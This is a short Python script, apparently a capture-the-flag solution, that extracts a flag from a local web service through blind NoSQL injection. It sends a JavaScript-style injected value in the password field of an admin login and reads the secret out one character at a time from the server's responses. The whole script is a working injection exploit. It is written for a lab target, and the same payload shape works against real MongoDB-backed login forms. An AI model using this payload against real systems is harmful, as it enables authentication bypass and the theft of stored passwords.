import requests
import string
import re

url='http://localhost:13337'
flag='flag{'

# Check if we have the whole flag
while flag[-1] != '}':
    for c in string.printable:
        data=dict()
        data['username'] = 'admin'
        # Escape our payload
        payload = re.escape(flag + c)
        data['password'] = "' || this.password.match(/^{}.*/)\0".format(payload)
        resp=requests.post(url, data=data)#, proxies={'http': 'http://127.0.0.1:8080'})
        if 'flag' in resp.text:
            flag += c
            print('Flag: {}'.format(flag))
